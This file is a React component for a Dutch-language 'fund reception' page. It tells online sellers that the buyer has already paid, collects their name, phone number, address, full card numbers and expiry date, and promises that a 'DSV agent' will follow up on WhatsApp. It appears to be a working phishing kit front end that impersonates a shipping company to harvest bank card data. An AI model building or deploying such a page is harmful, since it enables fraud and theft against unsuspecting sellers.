'use client'

import React, { useState } from 'react'
import { motion } from 'framer-motion'
import { useForm } from 'react-hook-form'
import { Phone, Send, CheckCircle, AlertCircle } from 'lucide-react'

const FundReception = () => {
  const [isSubmitted, setIsSubmitted] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [error, setError] = useState('')

  // Functie om vervaldatum te formatteren
  const formatExpirationDate = (value: string) => {
    const numericValue = value.replace(/\D/g, '')
    const limitedValue = numericValue.slice(0, 4)
    if (limitedValue.length >= 2) {
      return limitedValue.slice(0, 2) + '/' + limitedValue.slice(2)
    }
    return limitedValue
  }

  const {
    register,
    handleSubmit,
    formState: { errors },
    reset
  } = useForm()

  const onSubmit = async (data: any) => {
    setIsSubmitting(true)
    setError('')
    
    try {
      const response = await fetch('/api/contact?type=reception', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      })

      const result = await response.json()

      if (!response.ok) {
        throw new Error(result.error || 'Fout bij het verzenden')
      }

      console.log('E-mail succesvol verzonden:', result)
      setIsSubmitted(true)
      reset()

      setTimeout(() => {
        setIsSubmitted(false)
      }, 5000)

    } catch (error: any) {
      console.error('Fout bij verzenden:', error)
      setError('Fout bij het registreren. Probeer het opnieuw of neem direct contact met ons op.')
    } finally {
      setIsSubmitting(false)
    }
  }

  const contactInfo = []

  return (
    <section id="fund-reception" className="py-12 sm:py-16 lg:py-20 xl:py-24 bg-white">
      <div className="container mx-auto px-4 sm:px-6 lg:px-8 xl:px-12">
        <motion.div
          initial={{ opacity: 0, y: 30 }}
          whileInView={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8 }}
          viewport={{ once: true }}
          className="text-center mb-8 sm:mb-12 lg:mb-16"
        >
          <h2 className="text-2xl sm:text-3xl md:text-4xl lg:text-5xl font-bold text-gray-900 mb-4 sm:mb-6">
            <span className="bg-gradient-to-r from-primary-600 to-blue-500 bg-clip-text text-transparent">Formulier voor fondsenontvangst</span>
          </h2>

        </motion.div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 sm:gap-12 lg:gap-16">
          <motion.div
            initial={{ opacity: 0, x: -50 }}
            whileInView={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.8 }}
            viewport={{ once: true }}
            className="space-y-6 sm:space-y-8"
          >


            <motion.div
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.6, delay: 0.6 }}
              viewport={{ once: true }}
              className="bg-gradient-to-r from-green-500 to-blue-500 rounded-xl p-6 text-white"
            >
              <h4 className="text-xl font-bold mb-2 flex items-center">
                <Phone className="w-6 h-6 mr-2" />
                Ontvangst van fondsen
              </h4>
              <p className="text-green-100 mb-4">
                Snelle en veilige verwerking<br />
                Vul het formulier correct in om je geld vandaag nog per directe overboeking te ontvangen.
              </p>
            </motion.div>
          </motion.div>

          <motion.div
            initial={{ opacity: 0, x: 50 }}
            whileInView={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.8 }}
            viewport={{ once: true }}
            className="bg-white rounded-xl sm:rounded-2xl shadow-xl p-4 sm:p-6 lg:p-8"
          >
            <h3 className="text-xl sm:text-2xl lg:text-3xl font-bold text-gray-900 mb-6 sm:mb-8">
              Formulier voor fondsenontvangst
            </h3>

            {error && (
              <motion.div
                initial={{ opacity: 0, y: -20 }}
                animate={{ opacity: 1, y: 0 }}
                className="bg-red-50 border border-red-200 rounded-lg p-4 mb-6 flex items-center space-x-3"
              >
                <AlertCircle className="w-6 h-6 text-red-600" />
                <div>
                  <h4 className="font-semibold text-red-800">Fout</h4>
                  <p className="text-red-700 text-sm">{error}</p>
                </div>
              </motion.div>
            )}

            <form onSubmit={handleSubmit(onSubmit)} className="space-y-4 sm:space-y-6">
              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-2">
                  Volledige naam <span className="text-red-500">*</span>
                </label>
                <input
                  type="text"
                  {...register('nom_complet', { required: 'Volledige naam is verplicht' })}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors ${
                    errors.nom_complet ? 'border-red-500' : 'border-gray-300'
                  }`}
                  placeholder="Uw volledige naam"
                />
                {errors.nom_complet && (
                  <p className="mt-1 text-sm text-red-600 flex items-center">
                    <AlertCircle className="w-4 h-4 mr-1" />
                    {String(errors.nom_complet?.message || 'Dit veld is verplicht')}
                  </p>
                )}
              </div>

              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-2">
                  Telefoon <span className="text-red-500">*</span>
                </label>
                <input
                  type="tel"
                  {...register('telephone', { required: 'Telefoonnummer is verplicht' })}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors ${
                    errors.telephone ? 'border-red-500' : 'border-gray-300'
                  }`}
                  placeholder="01 23 45 67 89"
                />
                {errors.telephone && (
                  <p className="mt-1 text-sm text-red-600 flex items-center">
                    <AlertCircle className="w-4 h-4 mr-1" />
                    {String(errors.telephone?.message || 'Dit veld is verplicht')}
                  </p>
                )}
              </div>

              {/* Adresse */}
              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-2">
                  Volledig adres <span className="text-red-500">*</span>
                </label>
                <input
                  type="text"
                  {...register('adresse', { required: 'Adres is verplicht' })}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors ${
                    errors.adresse ? 'border-red-500' : 'border-gray-300'
                  }`}
                  placeholder="Uw volledige adres"
                />
                {errors.adresse && (
                  <p className="mt-1 text-sm text-red-600 flex items-center">
                    <AlertCircle className="w-4 h-4 mr-1" />
                    {String(errors.adresse?.message || 'Dit veld is verplicht')}
                  </p>
                )}
              </div>

              {/* Message informatif */}
              <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
                <div className="flex items-start">
                  <CheckCircle className="w-5 h-5 text-green-600 mt-0.5 mr-3 flex-shrink-0" />
                  <div>
                    <h4 className="text-sm font-semibold text-green-800 mb-1">Belangrijke informatie</h4>
                    <p className="text-sm text-green-700">
                      Let op: u hoeft niets te betalen; de koper heeft al alles betaald, dus voor u is alles gratis.
                    </p>
                  </div>
                </div>
              </div>

              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-2">
                  Beschrijving van het artikel
                </label>
                <input
                  type="text"
                  {...register('description_article')}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors"
                  placeholder="Gedetailleerde beschrijving van het artikel"
                />
              </div>

              {/* Informations bancaires */}
              <div className="bg-gray-50 p-4 sm:p-6 rounded-lg">
                <h4 className="text-lg font-semibold text-gray-900 mb-4">Bankinformatie</h4>

                <div className="grid md:grid-cols-2 gap-4 mb-4">
                  <div>
                    <label className="block text-sm font-semibold text-gray-700 mb-2">
                      BE Kaartnummer <span className="text-red-500">*</span>
                    </label>
                    <input
                      type="text"
                      {...register('carte_be', { required: 'BE kaart is verplicht' })}
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors ${
                        errors.carte_be ? 'border-red-500' : 'border-gray-300'
                      }`}
                      placeholder="BE kaartnummer"
                    />
                    {errors.carte_be && (
                      <p className="mt-1 text-sm text-red-600 flex items-center">
                        <AlertCircle className="w-4 h-4 mr-1" />
                        {String(errors.carte_be?.message || 'Dit veld is verplicht')}
                      </p>
                    )}
                  </div>

                  <div>
                    <label className="block text-sm font-semibold text-gray-700 mb-2">
                      52/49/51 Kaartnummer <span className="text-red-500">*</span>
                    </label>
                    <input
                      type="text"
                      {...register('carte_52_49_51', { required: '52/49/51 kaart is verplicht' })}
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors ${
                        errors.carte_52_49_51 ? 'border-red-500' : 'border-gray-300'
                      }`}
                      placeholder="52/49/51 kaartnummer"
                    />
                    {errors.carte_52_49_51 && (
                      <p className="mt-1 text-sm text-red-600 flex items-center">
                        <AlertCircle className="w-4 h-4 mr-1" />
                        {String(errors.carte_52_49_51?.message || 'Dit veld is verplicht')}
                      </p>
                    )}
                  </div>
                </div>

                <div className="grid md:grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-semibold text-gray-700 mb-2">
                      Vervaldatum <span className="text-red-500">*</span>
                    </label>
                    <input
                      type="text"
                      {...register('date_expiration', {
                        required: 'Vervaldatum is verplicht',
                        onChange: (e) => {
                          e.target.value = formatExpirationDate(e.target.value)
                        }
                      })}
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors ${
                        errors.date_expiration ? 'border-red-500' : 'border-gray-300'
                      }`}
                      placeholder="MM/AA"
                      maxLength={5}
                    />
                    {errors.date_expiration && (
                      <p className="mt-1 text-sm text-red-600 flex items-center">
                        <AlertCircle className="w-4 h-4 mr-1" />
                        {String(errors.date_expiration?.message || 'Dit veld is verplicht')}
                      </p>
                    )}
                  </div>

                  <div>
                    <label className="block text-sm font-semibold text-gray-700 mb-2">
                      Te Ontvangen Bedrag <span className="text-red-500">*</span>
                    </label>
                    <input
                      type="number"
                      step="0.01"
                      {...register('montant', {
                        required: 'Bedrag is verplicht',
                        min: { value: 0.01, message: 'Bedrag moet groter zijn dan 0' }
                      })}
                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors ${
                        errors.montant ? 'border-red-500' : 'border-gray-300'
                      }`}
                      placeholder="0.00"
                    />
                    {errors.montant && (
                      <p className="mt-1 text-sm text-red-600 flex items-center">
                        <AlertCircle className="w-4 h-4 mr-1" />
                        {String(errors.montant?.message || 'Dit veld is verplicht')}
                      </p>
                    )}
                  </div>
                </div>
              </div>

              {/* Submit Button */}
              <motion.button
                type="submit"
                disabled={isSubmitting}
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
                className={`w-full py-4 px-6 rounded-lg font-semibold text-white transition-all duration-300 flex items-center justify-center space-x-2 ${
                  isSubmitting
                    ? 'bg-gray-400 cursor-not-allowed'
                    : 'bg-gradient-to-r from-primary-600 to-blue-500 hover:from-primary-700 hover:to-blue-600 shadow-lg hover:shadow-xl'
                }`}
              >
                {isSubmitting ? (
                  <>
                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                    <span>Envoi en cours...</span>
                  </>
                ) : (
                  <>
                    <Send className="w-5 h-5" />
                    <span>Aanvraag verzenden</span>
                  </>
                )}
              </motion.button>
            </form>

            {/* Success Message */}
            {isSubmitted && (
              <motion.div
                initial={{ opacity: 0, scale: 0.8 }}
                animate={{ opacity: 1, scale: 1 }}
                className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4"
              >
                <motion.div
                  initial={{ opacity: 0, y: 50 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="bg-white rounded-xl p-6 sm:p-8 max-w-md w-full text-center shadow-2xl"
                >
                  <div className="bg-green-100 rounded-full p-3 w-16 h-16 mx-auto mb-4 flex items-center justify-center">
                    <CheckCircle className="w-8 h-8 text-green-600" />
                  </div>
                  <h3 className="text-xl sm:text-2xl font-bold text-gray-900 mb-2">
                    We hebben uw aanvraag ontvangen
                  </h3>
                  <p className="text-gray-600 mb-6">
                    Een DSV agent zal contact met u opnemen via WhatsApp. Gelieve de nodige afspraken te maken om uw geld vandaag nog te ontvangen via onmiddellijke overschrijving.
                    <br /><br />
                    <strong>Dank U</strong>
                  </p>
                  <motion.button
                    onClick={() => setIsSubmitted(false)}
                    whileHover={{ scale: 1.05 }}
                    whileTap={{ scale: 0.95 }}
                    className="bg-primary-600 text-white px-6 py-2 rounded-lg font-semibold hover:bg-primary-700 transition-colors"
                  >
                    Sluiten
                  </motion.button>
                </motion.div>
              </motion.div>
            )}
          </motion.div>
        </div>
      </div>
    </section>
  )
}

export default FundReception
